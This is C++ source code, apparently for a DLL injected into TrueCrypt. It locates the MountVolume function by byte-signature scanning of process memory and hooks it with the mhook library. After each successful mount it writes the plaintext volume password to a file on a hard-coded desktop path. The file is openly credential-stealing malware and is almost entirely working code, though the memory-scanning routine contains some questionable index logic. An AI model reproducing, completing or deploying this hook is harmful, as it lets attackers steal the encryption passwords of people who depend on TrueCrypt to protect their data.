#include "stdafx.h"
#include "TrueCryptStealHook.h"
#include "mhook-lib/mhook.h"

_MountVolume RealMountVolume;

int FakeMountVolume(HWND hwndDlg, int driveNo, char *volumePath, Password *password, BOOL cachePassword, BOOL sharedAccess, const MountOptions* const mountOptions, BOOL quiet, BOOL bReportWrongPassword)
{
	int result_mount = RealMountVolume(hwndDlg, driveNo, volumePath, password, cachePassword, sharedAccess, mountOptions, quiet, bReportWrongPassword);

	if (result_mount > 0)
		SaveStealPassword(volumePath, password->Text, password->Length);

	return result_mount;
}

void SaveStealPassword(LPSTR volumePath, PBYTE password, UINT passwordLen)
{
	CHAR fileToSave[MAX_PATH];
	GetFilePathToSaveStealPassword("C:\\Users\\Sony\\Desktop\\", volumePath, fileToSave);

	HANDLE hFile = CreateFileA(fileToSave, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	DWORD bytesWriten = 0;
	WriteFile(hFile, password, passwordLen, &bytesWriten, NULL);

	CloseHandle(hFile);
}

void GetFilePathToSaveStealPassword(LPSTR rootPath, LPSTR volumePath, LPSTR fileToSave)
{
	size_t lenFileToSave = 0;

	while (*rootPath != '\0')
	{
		*(fileToSave++) = *(rootPath++);
		++lenFileToSave;
	}

	for (size_t i = 0; volumePath[i] != '\0'; ++i)
	{
		if (volumePath[i] == '\\')
			*fileToSave = '+';
		else if (volumePath[i] == ':')
			*fileToSave = '=';
		else
			*fileToSave = volumePath[i];

		++fileToSave;
		++lenFileToSave;
	}

	*fileToSave = '\0';
	fileToSave -= lenFileToSave;
}

BOOL TrueCryptStealHook()
{
	HANDLE hProc = GetCurrentProcess();
	if (hProc == NULL)
		return FALSE;

	LPVOID baseAddress;
	DWORD baseSize;
	WCHAR moduleName[14] = L"TrueCrypt.exe";

	if (GetBaseAddressAndSizeModuleInProcess(hProc, baseAddress, baseSize, moduleName, 14))
	{
		LPVOID functionAddress;
		BYTE functionBytes[5] = { 0xB8, 0x34, 0x27, 0x00, 0x00 };

		if (GetFunctionAddressInProcessMemory(hProc, baseAddress, baseSize, functionAddress, functionBytes, 5))
		{
			RealMountVolume = (_MountVolume)functionAddress;

			if (Mhook_SetHook((PVOID *)&RealMountVolume, FakeMountVolume))
				MessageBoxA(NULL, "Hooked", "MountVolume", MB_OK);
		}
	}

	return TRUE;
}

BOOL GetBaseAddressAndSizeModuleInProcess(HANDLE hProc, LPVOID &base, DWORD &size, LPWCH needModuleName, int needModuleNameSize)
{
	HMODULE hModules[1024];
	DWORD cbNeeded;

	if (EnumProcessModules(hProc, hModules, sizeof(hModules), &cbNeeded))
	{
		MODULEINFO modInfo;

		for (size_t i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			WCHAR szModName[MAX_PATH];
			if (!GetModuleFileNameExW(hProc, hModules[i], szModName, MAX_PATH))
				return FALSE;

			if (!FullModuleNameIsTrueModuleName(szModName, needModuleName, needModuleNameSize))
				continue;

			if (!GetModuleInformation(hProc, hModules[i], &modInfo, sizeof(MODULEINFO)))
				return FALSE;

			base = modInfo.lpBaseOfDll;
			size = modInfo.SizeOfImage;

			return TRUE;
		}
	}

	return FALSE;
}

BOOL FullModuleNameIsTrueModuleName(LPWCH moduleName, LPWCH trueModuleName, int trueModuleNameSize)
{
	LPWCH pEndStr = moduleName;

	while (*pEndStr != L'\0')
		++pEndStr;

	if (pEndStr - moduleName < trueModuleNameSize - 1)
		return FALSE;

	for (int i = trueModuleNameSize - 1; i >= 0; --i, --pEndStr)
		if (*pEndStr != trueModuleName[i])
			return FALSE;

	return TRUE;
}

BOOL GetFunctionAddressInProcessMemory(HANDLE hProc, LPVOID base, DWORD size, LPVOID &functionAddress, PBYTE bytes, int countBytes)
{
	SIZE_T bytesRead = 0;
	PBYTE currentMemPos = (PBYTE)base;
	int currentBytesPos = 0;
	int countBytesNeedRead = countBytes;
	int offsetBufferPos = 0;

	PBYTE save_buffer = (PBYTE)LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, countBytes * 2);
	PBYTE buffer = save_buffer + countBytes;

	while (countBytesNeedRead == countBytes)
	{
		countBytesNeedRead = min((int)((PBYTE)base + size - currentMemPos), countBytes);
		if (ReadProcessMemory(hProc, currentMemPos, buffer, countBytesNeedRead, &bytesRead) == NULL || bytesRead == 0)
		{
			LocalFree(save_buffer);
			return FALSE;
		}

		for (size_t i = offsetBufferPos; i < bytesRead; ++i)
		{
			for (size_t j = i; j < bytesRead + min(0, i); ++j)
			{
				if (buffer[j] == bytes[currentBytesPos])
				{
					++currentBytesPos;

					if (currentBytesPos == countBytes - 1)
					{
						functionAddress = currentMemPos + i;
						LocalFree(save_buffer);
						return TRUE;
					}
				}
				else
				{
					currentBytesPos = 0;
					break;
				}
			}

			if (currentBytesPos != 0)
			{
				CopyMemory(save_buffer, buffer, countBytes);
				offsetBufferPos = i - countBytes + 1;
				break;
			}
		}

		currentMemPos += countBytes;
	}

	LocalFree(save_buffer);
	return FALSE;
}